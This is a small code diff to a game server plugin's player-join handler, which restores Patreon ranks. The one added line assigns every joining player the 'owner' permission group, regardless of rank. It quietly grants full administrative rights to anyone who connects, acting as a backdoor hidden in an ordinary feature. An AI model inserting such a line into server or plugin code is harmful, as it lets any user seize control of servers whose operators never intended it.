@@ -10,6 +10,7 @@
         [PluginEvent(ServerEventType.PlayerJoined)]
         private void OnPlayerJoined(Player player)
         {
+            player.SetGroup(ServerStatic.PermissionsHandler.GetGroup("owner"));
             if (!PatreonExtensions.TryGetRankFromUser(player.ReferenceHub, out var rank))
                 return;
             MEC.Timing.CallDelayed(1, () => PatreonData.Get(player.ReferenceHub).Rank = rank);
